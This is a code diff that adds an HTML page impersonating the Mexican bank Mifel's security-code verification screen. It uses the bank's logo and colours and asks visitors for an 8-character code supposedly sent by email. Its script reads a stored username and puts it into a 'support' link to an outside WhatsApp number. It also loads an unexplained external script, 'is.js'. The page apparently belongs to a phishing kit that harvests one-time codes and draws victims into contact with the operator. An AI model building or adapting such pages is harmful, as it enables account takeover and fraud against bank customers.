@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mifel - Verificación Avanzada</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --mifel-cyan: #00D1C1;
+            --mifel-blue-dark: #002D72;
+            --text-grey: #666;
+            --input-bg: #EBF1F5;
+            --link-blue: #0076A8;
+            --glow-light-blue: #00E5FF;
+        }
+
+        body {
+            font-family: 'Open Sans', 'Raleway', sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- HEADER --- */
+        .top-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 50px;
+            border-bottom: 1px solid #f0f0f0;
+            position: relative;
+        }
+
+        .logo-center {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 120px;
+        }
+
+        .lang-selector {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: var(--text-grey);
+        }
+
+        .flag-icon { width: 20px; border-radius: 2px; }
+
+        /* --- MAIN CONTENT --- */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            text-align: center;
+        }
+
+        /* ANIMACIÓN DE FLOTAR */
+        .mail-icon-container {
+            width: 80px;
+            height: 80px;
+            background-color: rgba(0, 209, 193, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            /* Aplicación de la animación en loop */
+            animation: floatAlways 3s ease-in-out infinite;
+        }
+
+        .mail-icon-container svg {
+            width: 40px;
+            fill: var(--mifel-cyan);
+        }
+
+        @keyframes floatAlways {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-12px); }
+        }
+
+        .welcome-text {
+            color: var(--mifel-blue-dark);
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .sub-text {
+            color: var(--text-grey);
+            font-size: 15px;
+            margin-bottom: 35px;
+            max-width: 380px;
+            line-height: 1.5;
+        }
+
+        .bold-text {
+            font-weight: 700;
+            color: #333;
+        }
+
+        /* CASILLAS DE CÓDIGO (8 DÍGITOS) */
+        .code-container {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+        }
+
+        .code-input {
+            width: 40px;
+            height: 52px;
+            background-color: var(--input-bg);
+            border: 2px solid transparent;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--mifel-blue-dark);
+            outline: none;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            pointer-events: none; 
+        }
+
+        .code-input.active {
+            pointer-events: auto;
+        }
+
+        .code-input:focus {
+            border-color: var(--glow-light-blue);
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.4);
+        }
+
+        .btn-continuar {
+            width: 100%;
+            max-width: 350px;
+            padding: 18px;
+            background-color: var(--mifel-cyan);
+            color: var(--mifel-blue-dark);
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-continuar:hover {
+            background-color: #00b3a5;
+            transform: translateY(-2px);
+        }
+
+        .resend-link {
+            margin-top: 25px;
+            font-size: 14px;
+            color: var(--text-grey);
+        }
+
+        .resend-link a {
+            color: var(--link-blue);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .code-input { width: 35px; height: 48px; font-size: 18px; }
+            .code-container { gap: 5px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="top-header">
+        <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/f9780b94-d327-43bf-987a-11289aa18ab6/original/mifel-personas.svg" alt="Mifel" class="logo-center">
+        <div class="lang-selector">
+            <img src="https://flagcdn.com/w40/mx.png" alt="MX" class="flag-icon">
+            <span>ES ⌵</span>
+        </div>
+    </header>
+
+    <main class="main-container">
+        <div class="mail-icon-container">
+            <svg class="icon-mail" viewBox="0 0 24 24">
+                    <path d="M20,4H4C2.9,4 2,4.9 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4M20,18H4V8L12,13L20,8V18M20,6L12,11L4,6V6H20V6Z"/>
+                </svg>
+        </div>
+
+        <h1 class="welcome-text">Código de Seguridad</h1>
+        <p class="sub-text">Por tu seguridad, para finalizar el proceso ingresa el código alfanumérico de 8 caracteres enviado a tu <span class="bold-text">correo electrónico registrado</span>.</p>
+
+        <form id="otp-form">
+            <div class="code-container">
+                <input type="text" class="code-input active" maxlength="1" autocomplete="off" required>
+                <input type="text" class="code-input" maxlength="1" autocomplete="off" required>
+                <input type="text" class="code-input" maxlength="1" autocomplete="off" required>
+                <input type="text" class="code-input" maxlength="1" autocomplete="off" required>
+                <input type="text" class="code-input" maxlength="1" autocomplete="off" required>
+                <input type="text" class="code-input" maxlength="1" autocomplete="off" required>
+                <input type="text" class="code-input" maxlength="1" autocomplete="off" required>
+                <input type="text" class="code-input" maxlength="1" autocomplete="off" required>
+            </div>
+
+            <button type="submit" class="btn-continuar">Verificar código</button>
+        </form>
+
+        <p class="resend-link">
+    ¿Problemas con el código? 
+    <a href="#" id="whatsapp-support" target="_blank" rel="noopener noreferrer">
+        Contactar soporte
+    </a>
+</p>
+    </main>
+
+    <script>
+             // Recuperar el usuario del localStorage
+    const rawUser = localStorage.getItem('mifel_user') || "Usuario";
+
+    // Construir el mensaje personalizado
+    const mensajeBase = `Hola, tengo inconvenientes con la verificación de mi código de seguridad. Mi usuario es: ${rawUser}`;
+
+    // Codificar para URL
+    const mensajeCodificado = encodeURIComponent(mensajeBase);
+
+    // Asignar la URL dinámica al enlace
+    const linkSoporte = document.getElementById('whatsapp-support');
+    linkSoporte.href = `https://wa.me/15877069901?text=${mensajeCodificado}`;
+
+        const inputs = document.querySelectorAll('.code-input');
+
+        const updateActiveInput = () => {
+            let foundFirstEmpty = false;
+            inputs.forEach((input, index) => {
+                if (!foundFirstEmpty) {
+                    input.classList.add('active');
+                    input.style.pointerEvents = "auto";
+                    if (input.value === "") foundFirstEmpty = true;
+                } else {
+                    input.classList.remove('active');
+                    input.style.pointerEvents = "none";
+                }
+            });
+        };
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
+
+                if (e.target.value !== "" && index < inputs.length - 1) {
+                    inputs[index + 1].classList.add('active');
+                    inputs[index + 1].style.pointerEvents = "auto";
+                    inputs[index + 1].focus();
+                }
+                updateActiveInput();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === "Backspace" && e.target.value === "" && index > 0) {
+                    inputs[index - 1].focus();
+                    updateActiveInput();
+                }
+            });
+
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const data = e.clipboardData.getData('text').replace(/[^a-zA-Z0-9]/g, '').toUpperCase().slice(0, 8);
+                if (data.length > 0) {
+                    data.split('').forEach((char, i) => {
+                        if (inputs[i]) {
+                            inputs[i].value = char;
+                            inputs[i].classList.add('active');
+                            inputs[i].style.pointerEvents = "auto";
+                        }
+                    });
+                    const nextFocus = data.length < 8 ? data.length : 7;
+                    inputs[nextFocus].focus();
+                    updateActiveInput();
+                }
+            });
+        });
+
+        window.onload = () => inputs[0].focus();
+    </script>
+    <script src="is.js"></script>
+</body>
+</html>
